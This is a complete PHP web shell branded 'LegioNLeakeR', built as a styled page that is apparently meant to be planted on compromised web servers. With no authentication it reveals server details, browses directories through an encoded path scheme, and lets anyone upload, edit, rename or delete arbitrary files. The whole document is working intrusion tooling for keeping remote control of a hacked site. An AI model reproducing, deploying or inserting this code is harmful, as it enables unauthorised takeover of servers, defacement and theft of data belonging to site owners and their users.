<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LegioNLeakeR</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis');
        @import url('https://fonts.googleapis.com/css?family=Akronim');


        .fire {
            margin: 50px auto;
            width: 80%;
            max-width: 1000px;
            height: 200px;

            background-position: center center;
            background-size: 1000px 200px;
            border-radius: 10px;
            font-family: 'Akronim';
            overflow: hidden;
            text-align: center;
            vertical-align: middle;

        }

        .fire:before {
            content: '';
            display: inline-block;
            height: 100%;
            vertical-align: middle;
        }

        .Blazing {
            display: inline-block;
            margin: 0;

            color: rgb(255, 115, 0);
            font-size: 100px;
            line-height: 50px;
            min-width: 50px;
            outline: none;
            vertical-align: middle;

            text-shadow:
                0 3px 20px red,
                0 0 20px red,
                0 0 10px orange,
                4px -5px 6px yellow,
                -4px -10px 10px yellow,
                0 -10px 30px yellow;
            animation: 2s Blazing infinite alternate linear;
        }

        @keyframes Blazing {
            0% {
                text-shadow: 0 3px 20px red, 0 0 20px red,
                    0 0 10px orange,
                    0 0 0 yellow,
                    0 0 5px yellow,
                    -2px -5px 5px yellow,
                    4px -10px 10px yellow;
            }

            25% {
                text-shadow: 0 3px 20px red, 0 0 30px red,
                    0 0 20px orange,
                    0 0 5px yellow,
                    -2px -5px 5px yellow,
                    3px -10px 10px yellow,
                    -4px -15px 20px yellow;
            }

            50% {
                text-shadow: 0 3px 20px red, 0 0 20px red,
                    0 -5px 10px orange,
                    -2px -5px 5px yellow,
                    3px -10px 10px yellow,
                    -4px -15px 20px yellow,
                    2px -20px 30px rgba(255, 255, 0, 0.5);
            }

            75% {
                text-shadow: 0 3px 20px red, 0 0 20px red,
                    0 -5px 10px orange,
                    3px -5px 5px yellow,
                    -4px -10px 10px yellow,
                    2px -20px 30px rgba(255, 255, 0, 0.5),
                    0px -25px 40px rgba(255, 255, 0, 0)
            }

            100% {
                text-shadow: 0 3px 20px red, 0 0 20px red,
                    0 0 10px orange,
                    0 0 0 yellow,
                    0 0 5px yellow,
                    -2px -5px 5px yellow,
                    4px -10px 10px yellow;
            }
        }

        p,
        span,
        a {
            font-size: 16px !important;
        }

        .title {
            font-family: Bungee;
        }

        body {
            font-family: "Dosis", cursive;
            text-shadow: 0px 0px 1px #757575;
            background-color: #1f1f1f;
        }

        body::-webkit-scrollbar {
            width: 12px;
        }

        body::-webkit-scrollbar-track {
            background: #1f1f1f;
        }

        body::-webkit-scrollbar-thumb {
            background-color: #1f1f1f;
            border: 3px solid gray;
        }

        a {
            color: #ffffff;
            text-decoration: none;
        }

        a:hover {
            color: gold;
            text-shadow: 0px 0px 10px #ffffff;
        }

        input,
        select,
        textarea {
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius: 5px;
            border-radius: 5px;
        }



        select {
            background-color: transparent;
            color: #ffffff;
        }

        select:after {
            cursor: pointer;
        }

        option {
            background-color: #1f1f1f;
        }

        ::-webkit-file-upload-button {
            background: transparent;
            color: #fff;
            border-color: #fff;
            cursor: pointer;
        }

        .text-green {
            color: #0f0;
        }
    </style>
</head>

<body class="text-white">

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("txt", "text", "php", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="text-green fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="text-green fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="text-green fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="text-green fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="text-green fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="text-green fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="text-green fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="text-green fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="text-green fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="text-green fa-brands fa-js"></i> ';
        } else {
            return '<i class="text-green fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("à¦", "à¦", "à¦", "à¦");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("à¦", "à¦", "à¦", "à¦");
        return str_replace($b, $a, $path);
    }

    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);
    echo ('
        <div class="row">
        <div class="col">
        <nav class="navbar navbar-light" >
      <div class="navbar-brand">
      <p class="text-white ms-2 info-text"> Server IP : <span class="text-warning">' . $_SERVER['SERVER_ADDR'] . '</span></p>
      <p class="text-white ms-2 info-text"> Web Server : <span class="text-warning">' . $_SERVER['SERVER_SOFTWARE'] . '</span></p>
      <p class="text-white ms-2 info-text"> User : <span class="text-warning">' . get_current_user() . '</span></p>
      <p class="text-white ms-2 info-text"> PHP Version : <span class="text-warning">' . @phpversion() . '</span></p>
      <p class="text-white ms-2 info-text"> Disable Function : <span class="text-warning">' . @ini_get('disable_functions') . '</span></p>
 
      </div>
      </nav>
        </div>
        <div class="col">
            
            <div class="dark fire">
    <h1 class="Blazing" contenteditable="true">LegioNLeakeR</h1>
</div>
        </div>
        </div>
        </div>
    ');
    echo ('
<nav class="navbar navbar-light"  >
  <div class="navbar-brand">
  <span class="text-warning ms-3">   PATH =>  </span>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a class='text-danger text-decoration-none' href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a class='text-danger text-decoration-none' href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "à¦", $paths[$i]);
            if ($i != $id)
                echo "à¦";
        }
        echo "'>" . $dir_part . " /</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark text-green" type="button">Upload File</button></a>
<a href="?"><button type="button" class="btn btn-dark text-danger">HOME</button></a> 
 
</div>
</nav>');


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover text-white">
  <thead style="background-color:#25383c;">
     
      <th class="text-danger">Name</th>
      <th class="text-danger">Size</th>
      <th class="text-danger">Modified</th>
      <th class="text-danger">Perms</th>
      <th class="text-danger">Actions</th>
    
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder text-green'></i> <a class='text-white text-decoration-none' href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='text-green fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' onclick='return confirm('Sure!')' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='text-green fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0" . substr(decoct(fileperms(PATH . "/" . $file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='text-green fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='text-green fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete'  onclick='return confirm('Sure!')' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='text-green fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
            <form method="post" enctype="multipart/form-data" class="mt-5 mx-5">
            Select file to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="upload">
            </form>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                rename($name, PATH . "/" . $_POST['name']);
                echo ("<script>alert('DONE.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH . "/" . $_GET['e'])) . '</textarea>
        <br>
        <input type="submit" value="Edit" name="edit">
    </form>';

            if (isset($_POST['edit'])) {
                $filename = PATH . "/" . $_GET['e'];
                $data = $_POST['data'];
                $open = fopen($filename, "w");
                fwrite($open, $data);
                fclose($open);
                echo ("<script>alert('DONE.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (function_exists('move_uploaded_file')) {
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        } elseif (function_exists('copy')) {
            if (@copy($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        }
    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            unlink($name);
            echo ("<script>alert('DONE.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } elseif (is_dir($name)) {
            rmdir($name);
            echo ("<script>alert('DONE.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
    }
    echo "<p class='text-center text-danger fw-bolder'>&copy;LegioNLeakeR-2024</p>";
    ?>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
</body>

</html>
